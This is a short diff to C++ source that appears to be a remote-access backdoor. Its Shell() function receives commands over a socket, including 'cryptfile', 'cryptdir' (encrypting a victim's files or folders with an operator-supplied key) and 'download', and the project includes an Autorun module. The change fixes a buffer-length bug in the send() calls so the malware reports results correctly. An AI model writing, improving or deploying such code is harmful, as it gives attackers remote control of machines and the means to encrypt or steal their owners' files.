@@ -12,7 +12,6 @@
 #include <fstream>
 #include <string>
 
-
 #include "Autorun.h"
 #include "Config.h"
 #include "Socket.h"
@@ -191,7 +190,7 @@ int Shell(SOCKADDR_IN addr) {
 			recv(conn, path, sizeof(path), NULL);
 			recv(conn, key, sizeof(key), NULL);
 			std::string res = CryptFile(path, atoi(key));
-			send(conn, res.c_str(), sizeof(res) * 300, NULL);
+			send(conn, res.c_str(), res.size(), NULL);
 		}
 
 		else if (!strcmp(buffer, "cryptdir")) {
@@ -201,7 +200,7 @@ int Shell(SOCKADDR_IN addr) {
 			recv(conn, path, sizeof(path), NULL);
 			recv(conn, key, sizeof(key), NULL);
 			std::string res = CryptDir(path, atoi(key));
-			send(conn, res.c_str(), sizeof(res) * 300, NULL);
+			send(conn, res.c_str(), res.size(), NULL);
 		}
 
 		else if (!strcmp(buffer, "download")) {
